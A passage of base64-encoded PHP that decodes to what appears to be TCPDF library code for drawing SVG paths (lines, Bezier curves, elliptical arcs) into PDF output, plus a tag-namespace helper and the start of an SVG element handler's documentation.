1ZHUGF0aCgkZCwgJHN0eWxlPScnKSB7CgkJaWYgKCR0aGlzLT5zdGF0ZSAhPSAyKSB7CgkJCXJldHVybjsKCQl9CgkJLy8gc2V0IGZpbGwvc3Ryb2tlIHN0eWxlCgkJJG9wID0gVENQREZfU1RBVElDOjpnZXRQYXRoUGFpbnRPcGVyYXRvcigkc3R5bGUsICcnKTsKCQlpZiAoZW1wdHkoJG9wKSkgewoJCQlyZXR1cm47CgkJfQoJCSRwYXRocyA9IGFycmF5KCk7CgkJJGQgPSBwcmVnX3JlcGxhY2UoJy8oWzAtOUFDSExNUVNUVlpdKShbXC1cK10pL3NpJywgJ1xcMSBcXDInLCAkZCk7CgkJJGQgPSBwcmVnX3JlcGxhY2UoJy8oXC5bMC05XSspKFwuKS9zJywgJ1xcMSBcXDInLCAkZCk7CgkJcHJlZ19tYXRjaF9hbGwoJy8oW0FDSExNUVNUVlpdKVtcc10qKFteQUNITE1RU1RWWlwiXSopL3NpJywgJGQsICRwYXRocywgUFJFR19TRVRfT1JERVIpOwoJCSR4ID0gMDsKCQkkeSA9IDA7CgkJJHgxID0gMDsKCQkkeTEgPSAwOwoJCSR4MiA9IDA7CgkJJHkyID0gMDsKCQkkeG1pbiA9IDIxNDc0ODM2NDc7CgkJJHhtYXggPSAwOwoJCSR5bWluID0gMjE0NzQ4MzY0NzsKCQkkeW1heCA9IDA7CgkJJHhpbml0aWFsID0gMDsKCQkkeWluaXRpYWwgPSAwOwoJCSRyZWxjb29yZCA9IGZhbHNlOwoJCSRtaW5sZW4gPSAoMC4wMSAvICR0aGlzLT5rKTsgLy8gbWluaW11bSBhY2NlcHRhYmxlIGxlbmd0aCAoMyBwb2ludCkKCQkkZmlyc3RjbWQgPSB0cnVlOyAvLyB1c2VkIHRvIHByaW50IGZpcnN0IHBvaW50CgkJLy8gZHJhdyBjdXJ2ZSBwaWVjZXMKCQlmb3JlYWNoICgkcGF0aHMgYXMgJGtleSA9PiAkdmFsKSB7CgkJCS8vIGdldCBjdXJ2ZSB0eXBlCgkJCSRjbWQgPSB0cmltKCR2YWxbMV0pOwoJCQlpZiAoc3RydG9sb3dlcigkY21kKSA9PSAkY21kKSB7CgkJCQkvLyB1c2UgcmVsYXRpdmUgY29vcmRpbmF0ZWQgaW5zdGVhZCBvZiBhYnNvbHV0ZQoJCQkJJHJlbGNvb3JkID0gdHJ1ZTsKCQkJCSR4b2Zmc2V0ID0gJHg7CgkJCQkkeW9mZnNldCA9ICR5OwoJCQl9IGVsc2UgewoJCQkJJHJlbGNvb3JkID0gZmFsc2U7CgkJCQkkeG9mZnNldCA9IDA7CgkJCQkkeW9mZnNldCA9IDA7CgkJCX0KCQkJJHBhcmFtcyA9IGFycmF5KCk7CgkJCWlmIChpc3NldCgkdmFsWzJdKSkgewoJCQkJLy8gZ2V0IGN1cnZlIHBhcmFtZXRlcnMKCQkJCXByZWdfbWF0Y2hfYWxsKCcvLT9cZCpcLj9cZCsvJywgdHJpbSgkdmFsWzJdKSwgJG1hdGNoZXMpOwoJCQkJJHJhd3BhcmFtcyA9ICRtYXRjaGVzWzBdOwoJCQkJJHBhcmFtcyA9IGFycmF5KCk7CgkJCQlmb3JlYWNoICgkcmF3cGFyYW1zIGFzICRjayA9PiAkY3ApIHsKCQkJCQkkcGFyYW1zWyRja10gPSAkdGhpcy0+Z2V0SFRNTFVuaXRUb1VuaXRzKCRjcCwgMCwgJHRoaXMtPnN2Z3VuaXQsIGZhbHNlKTsKCQkJCQlpZiAoYWJzKCRwYXJhbXNbJGNrXSkgPCAkbWlubGVuKSB7CgkJCQkJCS8vIGFwcHJveGltYXRlIGxpdHRsZSB2YWx1ZXMgdG8gemVybwoJCQkJCQkkcGFyYW1zWyRja10gPSAwOwoJCQkJCX0KCQkJCX0KCQkJfQoJCQkvLyBzdG9yZSBjdXJyZW50IG9yaWdpbiBwb2ludAoJCQkkeDAgPSAkeDsKCQkJJHkwID0gJHk7CgkJCXN3aXRjaCAoc3RydG91cHBlcigkY21kKSkgewoJCQkJY2FzZSAnTSc6IHsgLy8gbW92ZXRvCgkJCQkJZm9yZWFjaCAoJHBhcmFtcyBhcyAkY2sgPT4gJGNwKSB7CgkJCQkJCWlmICgoJGNrICUgMikgPT0gMCkgewoJCQkJCQkJJHggPSAkY3AgKyAkeG9mZnNldDsKCQkJCQkJfSBlbHNlIHsKCQkJCQkJCSR5ID0gJGNwICsgJHlvZmZzZXQ7CgkJCQkJCQlpZiAoJGZpcnN0Y21kIE9SIChhYnMoJHgwIC0gJHgpID49ICRtaW5sZW4pIE9SIChhYnMoJHkwIC0gJHkpID49ICRtaW5sZW4pKSB7CgkJCQkJCQkJaWYgKCRjayA9PSAxKSB7CgkJCQkJCQkJCSR0aGlzLT5fb3V0UG9pbnQoJHgsICR5KTsKCQkJCQkJCQkJJGZpcnN0Y21kID0gZmFsc2U7CgkJCQkJCQkJCSR4aW5pdGlhbCA9ICR4OwoJCQkJCQkJCQkkeWluaXRpYWwgPSAkeTsKCQkJCQkJCQl9IGVsc2UgewoJCQkJCQkJCQkkdGhpcy0+X291dExpbmUoJHgsICR5KTsKCQkJCQkJCQl9CgkJCQkJCQkJJHgwID0gJHg7CgkJCQkJCQkJJHkwID0gJHk7CgkJCQkJCQl9CgkJCQkJCQkkeG1pbiA9IG1pbigkeG1pbiwgJHgpOwoJCQkJCQkJJHltaW4gPSBtaW4oJHltaW4sICR5KTsKCQkJCQkJCSR4bWF4ID0gbWF4KCR4bWF4LCAkeCk7CgkJCQkJCQkkeW1heCA9IG1heCgkeW1heCwgJHkpOwoJCQkJCQkJaWYgKCRyZWxjb29yZCkgewoJCQkJCQkJCSR4b2Zmc2V0ID0gJHg7CgkJCQkJCQkJJHlvZmZzZXQgPSAkeTsKCQkJCQkJCX0KCQkJCQkJfQoJCQkJCX0KCQkJCQlicmVhazsKCQkJCX0KCQkJCWNhc2UgJ0wnOiB7IC8vIGxpbmV0bwoJCQkJCWZvcmVhY2ggKCRwYXJhbXMgYXMgJGNrID0+ICRjcCkgewoJCQkJCQlpZiAoKCRjayAlIDIpID09IDApIHsKCQkJCQkJCSR4ID0gJGNwICsgJHhvZmZzZXQ7CgkJCQkJCX0gZWxzZSB7CgkJCQkJCQkkeSA9ICRjcCArICR5b2Zmc2V0OwoJCQkJCQkJaWYgKChhYnMoJHgwIC0gJHgpID49ICRtaW5sZW4pIE9SIChhYnMoJHkwIC0gJHkpID49ICRtaW5sZW4pKSB7CgkJCQkJCQkJJHRoaXMtPl9vdXRMaW5lKCR4LCAkeSk7CgkJCQkJCQkJJHgwID0gJHg7CgkJCQkJCQkJJHkwID0gJHk7CgkJCQkJCQl9CgkJCQkJCQkkeG1pbiA9IG1pbigkeG1pbiwgJHgpOwoJCQkJCQkJJHltaW4gPSBtaW4oJHltaW4sICR5KTsKCQkJCQkJCSR4bWF4ID0gbWF4KCR4bWF4LCAkeCk7CgkJCQkJCQkkeW1heCA9IG1heCgkeW1heCwgJHkpOwoJCQkJCQkJaWYgKCRyZWxjb29yZCkgewoJCQkJCQkJCSR4b2Zmc2V0ID0gJHg7CgkJCQkJCQkJJHlvZmZzZXQgPSAkeTsKCQkJCQkJCX0KCQkJCQkJfQoJCQkJCX0KCQkJCQlicmVhazsKCQkJCX0KCQkJCWNhc2UgJ0gnOiB7IC8vIGhvcml6b250YWwgbGluZXRvCgkJCQkJZm9yZWFjaCAoJHBhcmFtcyBhcyAkY2sgPT4gJGNwKSB7CgkJCQkJCSR4ID0gJGNwICsgJHhvZmZzZXQ7CgkJCQkJCWlmICgoYWJzKCR4MCAtICR4KSA+PSAkbWlubGVuKSBPUiAoYWJzKCR5MCAtICR5KSA+PSAkbWlubGVuKSkgewoJCQkJCQkJJHRoaXMtPl9vdXRMaW5lKCR4LCAkeSk7CgkJCQkJCQkkeDAgPSAkeDsKCQkJCQkJCSR5MCA9ICR5OwoJCQkJCQl9CgkJCQkJCSR4bWluID0gbWluKCR4bWluLCAkeCk7CgkJCQkJCSR4bWF4ID0gbWF4KCR4bWF4LCAkeCk7CgkJCQkJCWlmICgkcmVsY29vcmQpIHsKCQkJCQkJCSR4b2Zmc2V0ID0gJHg7CgkJCQkJCX0KCQkJCQl9CgkJCQkJYnJlYWs7CgkJCQl9CgkJCQljYXNlICdWJzogeyAvLyB2ZXJ0aWNhbCBsaW5ldG8KCQkJCQlmb3JlYWNoICgkcGFyYW1zIGFzICRjayA9PiAkY3ApIHsKCQkJCQkJJHkgPSAkY3AgKyAkeW9mZnNldDsKCQkJCQkJaWYgKChhYnMoJHgwIC0gJHgpID49ICRtaW5sZW4pIE9SIChhYnMoJHkwIC0gJHkpID49ICRtaW5sZW4pKSB7CgkJCQkJCQkkdGhpcy0+X291dExpbmUoJHgsICR5KTsKCQkJCQkJCSR4MCA9ICR4OwoJCQkJCQkJJHkwID0gJHk7CgkJCQkJCX0KCQkJCQkJJHltaW4gPSBtaW4oJHltaW4sICR5KTsKCQkJCQkJJHltYXggPSBtYXgoJHltYXgsICR5KTsKCQkJCQkJaWYgKCRyZWxjb29yZCkgewoJCQkJCQkJJHlvZmZzZXQgPSAkeTsKCQkJCQkJfQoJCQkJCX0KCQkJCQlicmVhazsKCQkJCX0KCQkJCWNhc2UgJ0MnOiB7IC8vIGN1cnZldG8KCQkJCQlmb3JlYWNoICgkcGFyYW1zIGFzICRjayA9PiAkY3ApIHsKCQkJCQkJJHBhcmFtc1skY2tdID0gJGNwOwoJCQkJCQlpZiAoKCgkY2sgKyAxKSAlIDYpID09IDApIHsKCQkJCQkJCSR4MSA9ICRwYXJhbXNbKCRjayAtIDUpXSArICR4b2Zmc2V0OwoJCQkJCQkJJHkxID0gJHBhcmFtc1soJGNrIC0gNCldICsgJHlvZmZzZXQ7CgkJCQkJCQkkeDIgPSAkcGFyYW1zWygkY2sgLSAzKV0gKyAkeG9mZnNldDsKCQkJCQkJCSR5MiA9ICRwYXJhbXNbKCRjayAtIDIpXSArICR5b2Zmc2V0OwoJCQkJCQkJJHggPSAkcGFyYW1zWygkY2sgLSAxKV0gKyAkeG9mZnNldDsKCQkJCQkJCSR5ID0gJHBhcmFtc1soJGNrKV0gKyAkeW9mZnNldDsKCQkJCQkJCSR0aGlzLT5fb3V0Q3VydmUoJHgxLCAkeTEsICR4MiwgJHkyLCAkeCwgJHkpOwoJCQkJCQkJJHhtaW4gPSBtaW4oJHhtaW4sICR4LCAkeDEsICR4Mik7CgkJCQkJCQkkeW1pbiA9IG1pbigkeW1pbiwgJHksICR5MSwgJHkyKTsKCQkJCQkJCSR4bWF4ID0gbWF4KCR4bWF4LCAkeCwgJHgxLCAkeDIpOwoJCQkJCQkJJHltYXggPSBtYXgoJHltYXgsICR5LCAkeTEsICR5Mik7CgkJCQkJCQlpZiAoJHJlbGNvb3JkKSB7CgkJCQkJCQkJJHhvZmZzZXQgPSAkeDsKCQkJCQkJCQkkeW9mZnNldCA9ICR5OwoJCQkJCQkJfQoJCQkJCQl9CgkJCQkJfQoJCQkJCWJyZWFrOwoJCQkJfQoJCQkJY2FzZSAnUyc6IHsgLy8gc2hvcnRoYW5kL3Ntb290aCBjdXJ2ZXRvCgkJCQkJZm9yZWFjaCAoJHBhcmFtcyBhcyAkY2sgPT4gJGNwKSB7CgkJCQkJCSRwYXJhbXNbJGNrXSA9ICRjcDsKCQkJCQkJaWYgKCgoJGNrICsgMSkgJSA0KSA9PSAwKSB7CgkJCQkJCQlpZiAoKCRrZXkgPiAwKSBBTkQgKChzdHJ0b3VwcGVyKCRwYXRoc1soJGtleSAtIDEpXVsxXSkgPT0gJ0MnKSBPUiAoc3RydG91cHBlcigkcGF0aHNbKCRrZXkgLSAxKV1bMV0pID09ICdTJykpKSB7CgkJCQkJCQkJJHgxID0gKDIgKiAkeCkgLSAkeDI7CgkJCQkJCQkJJHkxID0gKDIgKiAkeSkgLSAkeTI7CgkJCQkJCQl9IGVsc2UgewoJCQkJCQkJCSR4MSA9ICR4OwoJCQkJCQkJCSR5MSA9ICR5OwoJCQkJCQkJfQoJCQkJCQkJJHgyID0gJHBhcmFtc1soJGNrIC0gMyldICsgJHhvZmZzZXQ7CgkJCQkJCQkkeTIgPSAkcGFyYW1zWygkY2sgLSAyKV0gKyAkeW9mZnNldDsKCQkJCQkJCSR4ID0gJHBhcmFtc1soJGNrIC0gMSldICsgJHhvZmZzZXQ7CgkJCQkJCQkkeSA9ICRwYXJhbXNbKCRjayldICsgJHlvZmZzZXQ7CgkJCQkJCQkkdGhpcy0+X291dEN1cnZlKCR4MSwgJHkxLCAkeDIsICR5MiwgJHgsICR5KTsKCQkJCQkJCSR4bWluID0gbWluKCR4bWluLCAkeCwgJHgxLCAkeDIpOwoJCQkJCQkJJHltaW4gPSBtaW4oJHltaW4sICR5LCAkeTEsICR5Mik7CgkJCQkJCQkkeG1heCA9IG1heCgkeG1heCwgJHgsICR4MSwgJHgyKTsKCQkJCQkJCSR5bWF4ID0gbWF4KCR5bWF4LCAkeSwgJHkxLCAkeTIpOwoJCQkJCQkJaWYgKCRyZWxjb29yZCkgewoJCQkJCQkJCSR4b2Zmc2V0ID0gJHg7CgkJCQkJCQkJJHlvZmZzZXQgPSAkeTsKCQkJCQkJCX0KCQkJCQkJfQoJCQkJCX0KCQkJCQlicmVhazsKCQkJCX0KCQkJCWNhc2UgJ1EnOiB7IC8vIHF1YWRyYXRpYyBCZXppZXIgY3VydmV0bwoJCQkJCWZvcmVhY2ggKCRwYXJhbXMgYXMgJGNrID0+ICRjcCkgewoJCQkJCQkkcGFyYW1zWyRja10gPSAkY3A7CgkJCQkJCWlmICgoKCRjayArIDEpICUgNCkgPT0gMCkgewoJCQkJCQkJLy8gY29udmVydCBxdWFkcmF0aWMgcG9pbnRzIHRvIGN1YmljIHBvaW50cwoJCQkJCQkJJHgxID0gJHBhcmFtc1soJGNrIC0gMyldICsgJHhvZmZzZXQ7CgkJCQkJCQkkeTEgPSAkcGFyYW1zWygkY2sgLSAyKV0gKyAkeW9mZnNldDsKCQkJCQkJCSR4YSA9ICgkeCArICgyICogJHgxKSkgLyAzOwoJCQkJCQkJJHlhID0gKCR5ICsgKDIgKiAkeTEpKSAvIDM7CgkJCQkJCQkkeCA9ICRwYXJhbXNbKCRjayAtIDEpXSArICR4b2Zmc2V0OwoJCQkJCQkJJHkgPSAkcGFyYW1zWygkY2spXSArICR5b2Zmc2V0OwoJCQkJCQkJJHhiID0gKCR4ICsgKDIgKiAkeDEpKSAvIDM7CgkJCQkJCQkkeWIgPSAoJHkgKyAoMiAqICR5MSkpIC8gMzsKCQkJCQkJCSR0aGlzLT5fb3V0Q3VydmUoJHhhLCAkeWEsICR4YiwgJHliLCAkeCwgJHkpOwoJCQkJCQkJJHhtaW4gPSBtaW4oJHhtaW4sICR4LCAkeGEsICR4Yik7CgkJCQkJCQkkeW1pbiA9IG1pbigkeW1pbiwgJHksICR5YSwgJHliKTsKCQkJCQkJCSR4bWF4ID0gbWF4KCR4bWF4LCAkeCwgJHhhLCAkeGIpOwoJCQkJCQkJJHltYXggPSBtYXgoJHltYXgsICR5LCAkeWEsICR5Yik7CgkJCQkJCQlpZiAoJHJlbGNvb3JkKSB7CgkJCQkJCQkJJHhvZmZzZXQgPSAkeDsKCQkJCQkJCQkkeW9mZnNldCA9ICR5OwoJCQkJCQkJfQoJCQkJCQl9CgkJCQkJfQoJCQkJCWJyZWFrOwoJCQkJfQoJCQkJY2FzZSAnVCc6IHsgLy8gc2hvcnRoYW5kL3Ntb290aCBxdWFkcmF0aWMgQmV6aWVyIGN1cnZldG8KCQkJCQlmb3JlYWNoICgkcGFyYW1zIGFzICRjayA9PiAkY3ApIHsKCQkJCQkJJHBhcmFtc1skY2tdID0gJGNwOwoJCQkJCQlpZiAoKCRjayAlIDIpICE9IDApIHsKCQkJCQkJCWlmICgoJGtleSA+IDApIEFORCAoKHN0cnRvdXBwZXIoJHBhdGhzWygka2V5IC0gMSldWzFdKSA9PSAnUScpIE9SIChzdHJ0b3VwcGVyKCRwYXRoc1soJGtleSAtIDEpXVsxXSkgPT0gJ1QnKSkpIHsKCQkJCQkJCQkkeDEgPSAoMiAqICR4KSAtICR4MTsKCQkJCQkJCQkkeTEgPSAoMiAqICR5KSAtICR5MTsKCQkJCQkJCX0gZWxzZSB7CgkJCQkJCQkJJHgxID0gJHg7CgkJCQkJCQkJJHkxID0gJHk7CgkJCQkJCQl9CgkJCQkJCQkvLyBjb252ZXJ0IHF1YWRyYXRpYyBwb2ludHMgdG8gY3ViaWMgcG9pbnRzCgkJCQkJCQkkeGEgPSAoJHggKyAoMiAqICR4MSkpIC8gMzsKCQkJCQkJCSR5YSA9ICgkeSArICgyICogJHkxKSkgLyAzOwoJCQkJCQkJJHggPSAkcGFyYW1zWygkY2sgLSAxKV0gKyAkeG9mZnNldDsKCQkJCQkJCSR5ID0gJHBhcmFtc1soJGNrKV0gKyAkeW9mZnNldDsKCQkJCQkJCSR4YiA9ICgkeCArICgyICogJHgxKSkgLyAzOwoJCQkJCQkJJHliID0gKCR5ICsgKDIgKiAkeTEpKSAvIDM7CgkJCQkJCQkkdGhpcy0+X291dEN1cnZlKCR4YSwgJHlhLCAkeGIsICR5YiwgJHgsICR5KTsKCQkJCQkJCSR4bWluID0gbWluKCR4bWluLCAkeCwgJHhhLCAkeGIpOwoJCQkJCQkJJHltaW4gPSBtaW4oJHltaW4sICR5LCAkeWEsICR5Yik7CgkJCQkJCQkkeG1heCA9IG1heCgkeG1heCwgJHgsICR4YSwgJHhiKTsKCQkJCQkJCSR5bWF4ID0gbWF4KCR5bWF4LCAkeSwgJHlhLCAkeWIpOwoJCQkJCQkJaWYgKCRyZWxjb29yZCkgewoJCQkJCQkJCSR4b2Zmc2V0ID0gJHg7CgkJCQkJCQkJJHlvZmZzZXQgPSAkeTsKCQkJCQkJCX0KCQkJCQkJfQoJCQkJCX0KCQkJCQlicmVhazsKCQkJCX0KCQkJCWNhc2UgJ0EnOiB7IC8vIGVsbGlwdGljYWwgYXJjCgkJCQkJZm9yZWFjaCAoJHBhcmFtcyBhcyAkY2sgPT4gJGNwKSB7CgkJCQkJCSRwYXJhbXNbJGNrXSA9ICRjcDsKCQkJCQkJaWYgKCgoJGNrICsgMSkgJSA3KSA9PSAwKSB7CgkJCQkJCQkkeDAgPSAkeDsKCQkJCQkJCSR5MCA9ICR5OwoJCQkJCQkJJHJ4ID0gbWF4KGFicygkcGFyYW1zWygkY2sgLSA2KV0pLCAuMDAwMDAwMDAxKTsKCQkJCQkJCSRyeSA9IG1heChhYnMoJHBhcmFtc1soJGNrIC0gNSldKSwgLjAwMDAwMDAwMSk7CgkJCQkJCQkkYW5nID0gLSRyYXdwYXJhbXNbKCRjayAtIDQpXTsKCQkJCQkJCSRhbmdsZSA9IGRlZzJyYWQoJGFuZyk7CgkJCQkJCQkkZmEgPSAkcmF3cGFyYW1zWygkY2sgLSAzKV07IC8vIGxhcmdlLWFyYy1mbGFnCgkJCQkJCQkkZnMgPSAkcmF3cGFyYW1zWygkY2sgLSAyKV07IC8vIHN3ZWVwLWZsYWcKCQkJCQkJCSR4ID0gJHBhcmFtc1soJGNrIC0gMSldICsgJHhvZmZzZXQ7CgkJCQkJCQkkeSA9ICRwYXJhbXNbJGNrXSArICR5b2Zmc2V0OwoJCQkJCQkJaWYgKChhYnMoJHgwIC0gJHgpIDwgJG1pbmxlbikgQU5EIChhYnMoJHkwIC0gJHkpIDwgJG1pbmxlbikpIHsKCQkJCQkJCQkvLyBlbmRwb2ludHMgYXJlIGFsbW9zdCBpZGVudGljYWwKCQkJCQkJCQkkeG1pbiA9IG1pbigkeG1pbiwgJHgpOwoJCQkJCQkJCSR5bWluID0gbWluKCR5bWluLCAkeSk7CgkJCQkJCQkJJHhtYXggPSBtYXgoJHhtYXgsICR4KTsKCQkJCQkJCQkkeW1heCA9IG1heCgkeW1heCwgJHkpOwoJCQkJCQkJfSBlbHNlIHsKCQkJCQkJCQkkY29zX2FuZyA9IGNvcygkYW5nbGUpOwoJCQkJCQkJCSRzaW5fYW5nID0gc2luKCRhbmdsZSk7CgkJCQkJCQkJJGEgPSAoKCR4MCAtICR4KSAvIDIpOwoJCQkJCQkJCSRiID0gKCgkeTAgLSAkeSkgLyAyKTsKCQkJCQkJCQkkeGEgPSAoJGEgKiAkY29zX2FuZykgLSAoJGIgKiAkc2luX2FuZyk7CgkJCQkJCQkJJHlhID0gKCRhICogJHNpbl9hbmcpICsgKCRiICogJGNvc19hbmcpOwoJCQkJCQkJCSRyeDIgPSAkcnggKiAkcng7CgkJCQkJCQkJJHJ5MiA9ICRyeSAqICRyeTsKCQkJCQkJCQkkeGEyID0gJHhhICogJHhhOwoJCQkJCQkJCSR5YTIgPSAkeWEgKiAkeWE7CgkJCQkJCQkJJGRlbHRhID0gKCR4YTIgLyAkcngyKSArICgkeWEyIC8gJHJ5Mik7CgkJCQkJCQkJaWYgKCRkZWx0YSA+IDEpIHsKCQkJCQkJCQkJJHJ4ICo9IHNxcnQoJGRlbHRhKTsKCQkJCQkJCQkJJHJ5ICo9IHNxcnQoJGRlbHRhKTsKCQkJCQkJCQkJJHJ4MiA9ICRyeCAqICRyeDsKCQkJCQkJCQkJJHJ5MiA9ICRyeSAqICRyeTsKCQkJCQkJCQl9CgkJCQkJCQkJJG51bWVyYXRvciA9ICgoJHJ4MiAqICRyeTIpIC0gKCRyeDIgKiAkeWEyKSAtICgkcnkyICogJHhhMikpOwoJCQkJCQkJCWlmICgkbnVtZXJhdG9yIDwgMCkgewoJCQkJCQkJCQkkcm9vdCA9IDA7CgkJCQkJCQkJfSBlbHNlIHsKCQkJCQkJCQkJJHJvb3QgPSBzcXJ0KCRudW1lcmF0b3IgLyAoKCRyeDIgKiAkeWEyKSArICgkcnkyICogJHhhMikpKTsKCQkJCQkJCQl9CgkJCQkJCQkJaWYgKCRmYSA9PSAkZnMpewoJCQkJCQkJCQkkcm9vdCAqPSAtMTsKCQkJCQkJCQl9CgkJCQkJCQkJJGNheCA9ICRyb290ICogKCgkcnggKiAkeWEpIC8gJHJ5KTsKCQkJCQkJCQkkY2F5ID0gLSRyb290ICogKCgkcnkgKiAkeGEpIC8gJHJ4KTsKCQkJCQkJCQkvLyBjb29yZGluYXRlcyBvZiBlbGxpcHNlIGNlbnRlcgoJCQkJCQkJCSRjeCA9ICgkY2F4ICogJGNvc19hbmcpIC0gKCRjYXkgKiAkc2luX2FuZykgKyAoKCR4MCArICR4KSAvIDIpOwoJCQkJCQkJCSRjeSA9ICgkY2F4ICogJHNpbl9hbmcpICsgKCRjYXkgKiAkY29zX2FuZykgKyAoKCR5MCArICR5KSAvIDIpOwoJCQkJCQkJCS8vIGdldCBhbmdsZXMKCQkJCQkJCQkkYW5ncyA9IFRDUERGX1NUQVRJQzo6Z2V0VmVjdG9yc0FuZ2xlKDEsIDAsICgoJHhhIC0gJGNheCkgLyAkcngpLCAoKCRjYXkgLSAkeWEpIC8gJHJ5KSk7CgkJCQkJCQkJJGRhbmcgPSBUQ1BERl9TVEFUSUM6OmdldFZlY3RvcnNBbmdsZSgoKCR4YSAtICRjYXgpIC8gJHJ4KSwgKCgkeWEgLSAkY2F5KSAvICRyeSksICgoLSR4YSAtICRjYXgpIC8gJHJ4KSwgKCgtJHlhIC0gJGNheSkgLyAkcnkpKTsKCQkJCQkJCQlpZiAoKCRmcyA9PSAwKSBBTkQgKCRkYW5nID4gMCkpIHsKCQkJCQkJCQkJJGRhbmcgLT0gKDIgKiBNX1BJKTsKCQkJCQkJCQl9IGVsc2VpZiAoKCRmcyA9PSAxKSBBTkQgKCRkYW5nIDwgMCkpIHsKCQkJCQkJCQkJJGRhbmcgKz0gKDIgKiBNX1BJKTsKCQkJCQkJCQl9CgkJCQkJCQkJJGFuZ2YgPSAkYW5ncyAtICRkYW5nOwoJCQkJCQkJCWlmICgoKCRmcyA9PSAwKSBBTkQgKCRhbmdzID4gJGFuZ2YpKSBPUiAoKCRmcyA9PSAxKSBBTkQgKCRhbmdzIDwgJGFuZ2YpKSkgewoJCQkJCQkJCQkvLyByZXZlcnNlIGFuZ2xlcwoJCQkJCQkJCQkkdG1wID0gJGFuZ3M7CgkJCQkJCQkJCSRhbmdzID0gJGFuZ2Y7CgkJCQkJCQkJCSRhbmdmID0gJHRtcDsKCQkJCQkJCQl9CgkJCQkJCQkJJGFuZ3MgPSByb3VuZChyYWQyZGVnKCRhbmdzKSwgNik7CgkJCQkJCQkJJGFuZ2YgPSByb3VuZChyYWQyZGVnKCRhbmdmKSwgNik7CgkJCQkJCQkJLy8gY292ZW50IGFuZ2xlcyB0byBwb3NpdGl2ZSB2YWx1ZXMKCQkJCQkJCQlpZiAoKCRhbmdzIDwgMCkgQU5EICgkYW5nZiA8IDApKSB7CgkJCQkJCQkJCSRhbmdzICs9IDM2MDsKCQkJCQkJCQkJJGFuZ2YgKz0gMzYwOwoJCQkJCQkJCX0KCQkJCQkJCQkkcGllID0gZmFsc2U7CgkJCQkJCQkJaWYgKCgka2V5ID09IDApIEFORCAoaXNzZXQoJHBhdGhzWygka2V5ICsgMSldWzFdKSkgQU5EICh0cmltKCRwYXRoc1soJGtleSArIDEpXVsxXSkgPT0gJ3onKSkgewoJCQkJCQkJCQkkcGllID0gdHJ1ZTsKCQkJCQkJCQl9CgkJCQkJCQkJbGlzdCgkYXhtaW4sICRheW1pbiwgJGF4bWF4LCAkYXltYXgpID0gJHRoaXMtPl9vdXRlbGxpcHRpY2FsYXJjKCRjeCwgJGN5LCAkcngsICRyeSwgJGFuZywgJGFuZ3MsICRhbmdmLCAkcGllLCAyLCBmYWxzZSwgKCRmcyA9PSAwKSwgdHJ1ZSk7CgkJCQkJCQkJJHhtaW4gPSBtaW4oJHhtaW4sICR4LCAkYXhtaW4pOwoJCQkJCQkJCSR5bWluID0gbWluKCR5bWluLCAkeSwgJGF5bWluKTsKCQkJCQkJCQkkeG1heCA9IG1heCgkeG1heCwgJHgsICRheG1heCk7CgkJCQkJCQkJJHltYXggPSBtYXgoJHltYXgsICR5LCAkYXltYXgpOwoJCQkJCQkJfQoJCQkJCQkJaWYgKCRyZWxjb29yZCkgewoJCQkJCQkJCSR4b2Zmc2V0ID0gJHg7CgkJCQkJCQkJJHlvZmZzZXQgPSAkeTsKCQkJCQkJCX0KCQkJCQkJfQoJCQkJCX0KCQkJCQlicmVhazsKCQkJCX0KCQkJCWNhc2UgJ1onOiB7CgkJCQkJJHRoaXMtPl9vdXQoJ2gnKTsKCQkJCQkkeCA9ICR4MCA9ICR4aW5pdGlhbDsKCQkJCQkkeSA9ICR5MCA9ICR5aW5pdGlhbDsKCQkJCQlicmVhazsKCQkJCX0KCQkJfQoJCQkkZmlyc3RjbWQgPSBmYWxzZTsKCQl9IC8vIGVuZCBmb3JlYWNoCgkJJHRoaXMtPl9vdXQoJG9wKTsKCQlyZXR1cm4gYXJyYXkoJHhtaW4sICR5bWluLCAoJHhtYXggLSAkeG1pbiksICgkeW1heCAtICR5bWluKSk7Cgl9CgoJLyoqCgkgKiBSZXR1cm4gdGhlIHRhZyBuYW1lIHdpdGhvdXQgdGhlIG5hbWVzcGFjZQoJICogQHBhcmFtIHN0cmluZyAkbmFtZSBUYWcgbmFtZQoJICogQHByb3RlY3RlZAoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gcmVtb3ZlVGFnTmFtZXNwYWNlKCRuYW1lKSB7CgkJaWYoc3RycG9zKCRuYW1lLCAnOicpICE9PSBmYWxzZSkgewoJCQkkcGFydHMgPSBleHBsb2RlKCc6JywgJG5hbWUpOwoJCQlyZXR1cm4gJHBhcnRzWyhzaXplb2YoJHBhcnRzKSAtIDEpXTsKCQl9CgkJcmV0dXJuICRuYW1lOwoJfQoKCS8qKgoJICogU2V0cyB0aGUgb3BlbmluZyBTVkcgZWxlbWVudCBoYW5kbGVyIGZ1bmN0aW9uIGZvciB0aGUgWE1MIHBhcnNlci4gKCoqKiBUTyBCRSBDT01QTEVURUQgKioqKQoJICogQHBhcmFtIHJlc291cmNlfHN0cmluZyAkcGFyc2VyIFRoZSBmaXJzdCBwYXJhbWV0ZXIsIHBhcnNlciwgaXMgYSByZWZlcmVuY2UgdG8gdGhlIFhNTCBwYXJzZXIgY2FsbGluZyB0aGUgaGFuZGxlci4KCSAqIEBwYXJhbSBzdHJpbmcgJG5hbWUgVGhlIHNlY29uZCBwYXJhbWV0ZXIsIG5hbWUsIGNvbnRhaW5zIHRoZSBuYW1lIG9mIHRoZSBlbGVtZW50IGZvciB3aGljaCB0aGlzIGhhbmRsZXIgaXMgY2FsbGVkLiBJZiBjYXNlLWZvbGRpbmcgaXMgaW4gZWZmZWN0IGZvciB0aGlzIHBhcnNlciwgdGhlIGVsZW1lbnQgbmFtZSB3aWxsIGJlIGluIHVwcGVyY2FzZSBsZXR0ZXJzLgoJICogQHBhcmFtIGFycmF5ICRhdHRyaWJzIFRoZSB0aGlyZCBwYXJhbWV0ZXIsIGF0dHJpYnMsIGNvbnRhaW5zIGFuIGFzc29jaWF0aXZlIGFycmF5IHdpdGggdGhlIGVsZW1lbnQncyBhdHRyaWJ1dGVzIChpZiBhbnkpLiBUaGUga2V5cyBvZiB0aGlzIGFycmF5IGFyZSB0aGUgYXR0cmlidXRlIG5hbWVzLCB0aGUgdmFsdWVzIGFyZSB0aGUgYXR0cmlidXRlIHZhbHVlcy4gQXR0cmlidXRlIG5hbWVzIGFyZSBjYXNlLWZvbGRlZCBvbiB0aGUgc2FtZSBjcml0ZXJpYSBhcyBlbGVtZW50IG5hbWVzLiBBdHRyaWJ1dGUgdmFsdWVzIGFyZSBub3QgY2FzZS1mb2xkZWQuIFRoZSBvcmlnaW5hbCBvcmRlciBv